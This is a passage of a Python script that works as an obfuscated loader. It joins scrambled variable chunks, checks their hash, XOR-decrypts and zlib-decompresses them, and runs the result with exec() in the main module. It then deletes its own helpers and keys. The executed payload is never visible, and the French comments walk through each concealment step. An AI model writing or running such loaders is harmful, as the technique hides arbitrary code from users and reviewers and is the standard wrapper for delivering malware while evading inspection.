_cxL6Lm1N36rB9p + _cbBNXtJgu783yr + _cgIS9KqFp9rXfE + _cysA6S186PjdMu + _cytsKir_LyvU6S + _cyN_LuZ2Hqcm86 + _ckZPqXB8b3n2Ga + _ceVBUXWzFZzZ40 + _can62i2bRojTOP + _csaKYdIIXUZLrj + _cupdLvmAmJVnYj + _cqCT1fkRuIKaCJ + _crC4AT7rta7I_A + _cziU5c8HwXCta9 + _c_6PIuqrOMs49z + _cipiDhlEBLOIP7 + _cr26uapbDTv2nU + _cxcFHuR7_oVQUK + _ciBzgCKiNEaugN + _ce0Ft4N7VfWY6U + _cu0QhBjfuAZgrR + _csVjSpqS8Xz4PM + _cct0lBgjnrcLAI + _cav4JwBIqfph0X + _ct6_ck2SVMG1HP + _cpByujCrpwhcD1 + _cgRH_ZWtP70XF2 + _cwU76lXtJmvmWD + _czB6DfeN22IKzH + _ce8vNRqMejKmRN + _crW4rIitW2Dfqm + _cdhCcvLeLW9FMI + _cyzrm2rhfiNKsr + _ccgKKuW6EtK6Qi + _cjrUmUSF10hyOE + _cebfeBy5daDwfe + _cj8DxMHEKApCr6 + _c_hqQHLi0pUzFE + _ctsJrxxs6xyaIy + _cqT5gsyutnqOSS + _c_g_69W4XRDFEs + _cvGhWsfsPpeE5a + _ccgwSXvTvoOTvl + _cuv_2_c_QZVbiM + _cu35LkNM0Lk0OJ + _cdAITXI4li4weq + _ciVhdoZuBvgUSZ + _cqICmXD9uF_Sq5 + _ccUGkbstJwkClX + _chdcX_ai4oSF1g + _cuVUWuOCq_sqgS + _cfS2_0PFc6NJtV + _clU2dsPhCsgxrz + _ctghTasyk42CX1 + _cgm0m3mpANBhcP + _cmpf3ibOxeJCn4 + _csACgCqtjoUcnQ + _cynTYSCDi3f272 + _cgxthdBuEqr39h + _cjxEJHSgMeETVC + _cm9_jJBwhQb9bf + _cqJFqISfp4y0RN + _ci6L9kNpwebCUH + _cbrxIsRujBJqpy + _cyMra8pFlCgylm + _ceptsVO32GDlJ1 + _ckmtjIUT4KCqQf + _cz0GgEyUU5Stp_ + _coxvrrqWibSCeA + _cnbAaoYhJwERQi + _cs8qj2Eky9_3kV + _capjuIo202nwsv + _cz0QrlhTRNOJG1 + _chxkHF3rCzge7x + _cxogl4E_MHPdVG + _coT0Ul55VZG6b9 + _cgMbsVNmMbFur1 + _cwimTKwm3GX7Vy + _ceJRfeNhJpiz_4 + _cyXo6_VbNDhp9Q + _cfnbJQkeBzrqvD + _caUpBtQ3Z8B0JX + _cdBBp8revUp8cq + _cs0k70HrGuegp8 + _cprJpAZXp_ABt9 + _chh8oWMaAQs0uE + _cw6fyT3oz4pNyF + _clgTdDI5iNWkMC + _cv2g1gx7YyvA3i + _ceeSgM6_gwq1rH + _cezGLNdi6oKhcJ + _cun5Cm4EstF4sj + _ct7N_KpFi5no__ + _cc7aDiVVRPcMK5 + _cuV8yLxOUfFV6i + _cvc0VHoWvwjOV9 + _cwujGafLczQT7y + _cjjU81MFyyOpg9 + _crOJkgK9gIqi2I)
if __import__('hashlib').sha256(_puBrgzuV2jAjZe).hexdigest() != '24993694781bea0abf13d1390603efe763a6cb5dbac0b15a13bdde419fe7b066':
    __import__('sys').exit(1)
_xxpX_cOD7gZgyM = bytes([46, 83, 121, 190, 86, 116, 77, 243, 229, 182, 174, 14, 176, 116, 111, 95, 178, 239, 182, 208, 62, 129, 187, 92])
_fkqUYqqiP0awfus = bytes([95, 53, 79, 178, 171, 49, 163, 206, 53, 58, 84, 244, 190, 232, 145, 227, 213, 169, 120, 214, 69, 147, 216, 247])

def _fxvQbd3zjB9f_KN(_b_vTrktrWjVpWV, _krbCEy3677JFSW):
    return bytes(_b_vTrktrWjVpWV[_ihmwiGdnpCwPDd] ^ _krbCEy3677JFSW[_ihmwiGdnpCwPDd % len(_krbCEy3677JFSW)] for _ihmwiGdnpCwPDd in range(len(_b_vTrktrWjVpWV)))

def _fdcK0q2HTtsVG7T(_tfo1ABFn3Mu1cQ):
    import zlib
    return zlib.decompress(_tfo1ABFn3Mu1cQ) # Un seul niveau de zlib ici pour simplifier

def _fe_mhS2Rp6BpbgS():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xfWnwgbCoQZkb2 = _fxvQbd3zjB9f_KN(_puBrgzuV2jAjZe, _xxpX_cOD7gZgyM)
    # 2. Décompression Zlib
    _dtMCumL3AXC8im = _fdcK0q2HTtsVG7T(_xfWnwgbCoQZkb2)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dtMCumL3AXC8im.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _na_VP5nU20aTDg = _main.__dict__
    _na_VP5nU20aTDg.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _na_VP5nU20aTDg)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fe_mhS2Rp6BpbgS()
try:
    del _fxvQbd3zjB9f_KN, _fdcK0q2HTtsVG7T, _fe_mhS2Rp6BpbgS
    del _puBrgzuV2jAjZe, _xxpX_cOD7gZgyM, _fkqUYqqiP0awfus
except:
    pass
